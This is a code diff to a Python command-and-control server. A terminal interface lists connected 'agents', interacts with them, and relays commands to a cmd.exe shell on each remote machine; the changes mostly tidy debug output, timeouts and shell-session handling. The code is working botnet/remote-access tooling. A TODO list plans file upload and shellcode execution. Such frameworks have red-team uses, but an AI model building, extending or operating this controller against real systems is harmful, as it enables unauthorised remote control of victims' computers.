@@ -28,7 +28,7 @@ import inspect
 # TODO:
 #   - verification if agent is alive?
 #   - kill agent
-#   - correct exit from shell
+#   [DONE] correct exit from shell
 #   [DONE] help messages of Cmd 
 #   - add HTTP transport
 #   - use commands (getpid, upload file, exec shellcode) and cmd.exe only if 'shell' entered
@@ -41,19 +41,20 @@ def main():
 class Terminal(Cmd):
     def __init__(self,Listeners,ClientDict):
         Cmd.__init__(self)
-        self.shell = False
         self.lport = 8008
         self.lhost = "0.0.0.0"
         self.listeners = Listeners
-        self.q = None
         self.ClientDict = ClientDict
+        self.shell = False
+        self.q = None
         self.agent = ''
+        self.parentagent = ''
         self.prompt = '$ '
 
 
     def do_interact(self,args):
         if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
-            self.help_list()
+            print("[-] No agent specified. Use: 'list agents'")
         else:
             self.agent = args
             try:
@@ -62,7 +63,7 @@ class Terminal(Cmd):
             except KeyError:
                 print("[-] No such agent. Use: 'list agents'")
             except Exception as ex:
-                print("[-] Unhandled exception: {}".format(ex))
+                print("[-] Unhandled exception in do_interact function: {}".format(ex))
 
 
     def do_shell(self,args):
@@ -71,24 +72,28 @@ class Terminal(Cmd):
             self.help_interact()
         else:
             self.q.put("shell\n")
-            self.parentagent = self.agent
-            self.shell = True
+            
             # For now shell is implemented in separate connection in agents
             # Sleep while shell connection is created
+            self.shell = True
+            self.parentagent = self.agent
             time.sleep(1)
-            print("[DBG] Getting new connection queue...")
-            # Parsing last agent ID
+ 
+            # Parsing last agent ID from queu
             self.agent = list(self.ClientDict.keys())[-1]
-            
             # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
-            print("[DBG] Shell Agent ID: {} and data:".format(self.agent))
-            print("{}".format(self.ClientDict[self.agent]))
-            self.do_interact(self.agent)
-            self.prompt = '{} shell> '.format(self.ClientDict[self.agent][0][0])
             
+            self.do_interact(self.agent)
+            self.prompt = '{} shell $ '.format(self.ClientDict[self.agent][0][0])
+            
+            # remove from ClientDict as not agent, but redundant connection
+            del self.ClientDict[self.agent]
+
+
     def do_back(self,args):
         if self.shell == True:
             self.q.put("exit\n")
+            self.shell = False
             self.do_interact(self.parentagent)
         else:
             self.q = None
@@ -97,6 +102,7 @@ class Terminal(Cmd):
     def do_exit(self,args):
         if self.shell == True:
             self.q.put("exit\n")
+            self.shell = False
             self.do_interact(self.parentagent)
         else:
             time.sleep(0.5)
@@ -133,7 +139,7 @@ class Terminal(Cmd):
             if (args.lower() == "agents" or args == "a"):
                 print("Agents:")#.format(ClientDict))
                 for i in self.ClientDict.keys():
-                    print("\tID: {}, IP: {}".format(i,ClientDict[i][0][0]))
+                    print("\tID: {} IP: {}".format(i,ClientDict[i][0][0]))
             elif (args.lower() == "lhost"):
                 print("lhost: {}".format(self.lhost))
             elif (args.lower() == "lport"):
@@ -238,7 +244,7 @@ class BotHandler(threading.Thread):
     def run(self):
         # Handling client thread
         AgentName = threading.current_thread().getName()
-        print("\n[*] Agent with ID {} connected from {}:{}\n".format(AgentName, self.ip, self.port))
+        print("\n[*] Agent with ID {} connected from {}:{}".format(AgentName, self.ip, self.port))
         
         # Initial message for socket state check on client side.
         # If socket ok, will credate 'cmd.exe' subprocess.
@@ -258,21 +264,27 @@ class BotHandler(threading.Thread):
             else:
                 banner += recv
         if banner:
-            print("\n[*] Received banner from {}:\n\n{}".format(AgentName, banner))
+            #print("[*] Received banner from {}:\n{}".format(AgentName, banner))
+            print(banner)
         time.sleep(0.5)
 
         # Command loop
         while True:
-            print("[DBG] BotHandler with AgentName {} here 1...".format(AgentName))
+            #print("[DBG] BotHandler with AgentName {} here 1...".format(AgentName))
             RecvBotCmd = self.q.get()
-            print("[DBG] BotHandler with AgentName {} here 2...".format(AgentName))
+            #print("[DBG] BotHandler with AgentName {} here 2...".format(AgentName))
+            print("[DBG] RecvBotCmd is {}".format(RecvBotCmd))
             try:
                 self.client.send(RecvBotCmd.encode('utf-8'))
-                print("[DBG] BotHandler with AgentName {} here 3...".format(AgentName))
+                #print("[DBG] BotHandler with AgentName {} here 3...".format(AgentName))
                 cmd_response = ""
                 while True:
-                    print("[DBG] BotHandler with AgentName {} here 4...".format(AgentName))
+                    #print("[DBG] BotHandler with AgentName {} here 4...".format(AgentName))
                     try:
+                        # Separate parsing for long commands...
+                        #longcommands = ["ping"]
+                        #if any(RecvBotCmd in s for s in longcommands):
+                        #    self.client.settimeout(5)
                         # Client returns entered command (because cmd.exe has it in input)
                         # So 
                         # if response is only as large as input - command not completed yet
@@ -282,8 +294,8 @@ class BotHandler(threading.Thread):
                         if (len(cmd_response) <= len(RecvBotCmd)):
                             self.client.settimeout(5)
                         else:
-                            self.client.settimeout(0.5)
-                        print("[DBG] BotHandler with AgentName {} here 5...".format(AgentName))
+                            self.client.settimeout(1)
+                        #print("[DBG] BotHandler with AgentName {} here 5...".format(AgentName))
                         recv = self.client.recv(4096).decode('utf-8')
                     except socket.timeout:
                         # if timeout exception is triggered - assume no data anymore
@@ -296,7 +308,7 @@ class BotHandler(threading.Thread):
                         break
                     else:
                         cmd_response += recv
-                    print("[DBG] BotHandler with AgentName {} here 6...".format(AgentName))
+                    #print("[DBG] BotHandler with AgentName {} here 6...".format(AgentName))
                 
                 # Removing sent command from response before printing output
                 print(cmd_response.replace(RecvBotCmd,""))
